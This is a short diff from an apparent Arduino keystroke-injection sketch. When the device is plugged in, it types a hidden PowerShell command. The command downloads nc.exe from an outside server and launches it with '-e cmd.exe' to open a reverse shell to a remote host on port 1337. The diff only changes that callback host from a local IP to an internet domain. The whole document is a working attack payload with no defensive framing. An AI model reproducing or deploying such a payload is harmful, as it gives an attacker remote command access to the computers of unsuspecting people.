@@ -21,7 +21,7 @@ void setup(){
 
 	delay(1000);
 
-	Keyboard.print("powershell -windowstyle hidden \"$a = (\\\"{0}\\nc.exe\\\" -f $(get-item hkcu:\\Environment).GetValue('tmp')); (new-object System.Net.WebClient).DownloadFile('https://nemanja.top/nc/nc.exe', $a); Start-Process $a -ArgumentList '-d -e cmd.exe 192.168.1.254 8181'\"");
+	Keyboard.print("powershell -windowstyle hidden \"$a = (\\\"{0}\\nc.exe\\\" -f $(get-item hkcu:\\Environment).GetValue('tmp')); (new-object System.Net.WebClient).DownloadFile('https://nemanja.top/nc/nc.exe', $a); Start-Process $a -ArgumentList '-d -e cmd.exe dokku.nemanjan00.org 1337'\"");
 
 	typeKey(KEY_RETURN);
 
